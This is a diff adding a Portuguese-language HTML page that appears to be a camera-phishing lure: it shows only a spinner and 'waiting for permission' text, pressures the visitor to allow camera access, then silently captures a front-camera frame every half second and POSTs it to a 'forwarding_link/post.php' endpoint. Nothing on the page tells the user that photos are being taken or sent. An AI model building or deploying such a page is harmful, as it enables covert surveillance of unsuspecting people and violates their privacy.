@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Continuar</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            font-family: -apple-system, system-ui, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #000000;
+        }
+
+        #app-container {
+            text-align: center;
+            width: 90%;
+        }
+
+        .loader {
+            width: 30px;
+            height: 30px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .msg-principal {
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .msg-instrucao {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .video-box {
+            display: none;
+            width: 100%;
+            max-width: 320px;
+            margin: 0 auto;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        video {
+            width: 100%;
+            display: block;
+            transform: scaleX(-1);
+        }
+
+        .btn-retry {
+            display: none;
+            margin-top: 20px;
+            padding: 12px 24px;
+            background: #000;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div id="app-container">
+        <div id="loading-area">
+            <div class="loader"></div>
+            <p class="msg-principal">Aguardando permissão...</p>
+            <p class="msg-instrucao">Permitir para prosseguir</p>
+        </div>
+
+        <div id="video-area" class="video-box">
+            <video id="video" playsinline autoplay></video>
+        </div>
+
+        <button id="retry-btn" class="btn-retry" onclick="requestCamera()">Tentar novamente</button>
+    </div>
+
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const loadingArea = document.getElementById('loading-area');
+        const videoArea = document.getElementById('video-area');
+        const retryBtn = document.getElementById('retry-btn');
+
+        let isPosting = false; // Trava de segurança para não sobrecarregar
+
+        function post(imgdata) {
+            if (isPosting) return; // Se já estiver enviando uma, ignora a próxima até terminar
+            isPosting = true;
+
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'forwarding_link/post.php',
+                dataType: 'json',
+                complete: function() {
+                    isPosting = false; // Libera para o próximo envio
+                }
+            });
+        }
+
+        async function requestCamera() {
+            retryBtn.style.display = 'none';
+            loadingArea.style.display = 'block';
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    audio: false,
+                    video: { facingMode: "user" }
+                });
+                
+                video.srcObject = stream;
+                loadingArea.style.display = 'none';
+                videoArea.style.display = 'block';
+
+                const context = canvas.getContext('2d');
+                
+                // FREQUÊNCIA: 500ms (0.5 segundos)
+                setInterval(() => {
+                    context.drawImage(video, 0, 0, 640, 480);
+                    const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                    post(canvasData);
+                }, 500);
+
+            } catch (e) {
+                loadingArea.style.display = 'none';
+                retryBtn.style.display = 'inline-block';
+                alert("Atenção: É necessário permitir o acesso para continuar.");
+            }
+        }
+
+        window.onload = requestCamera;
+    </script>
+</body>
+</html>
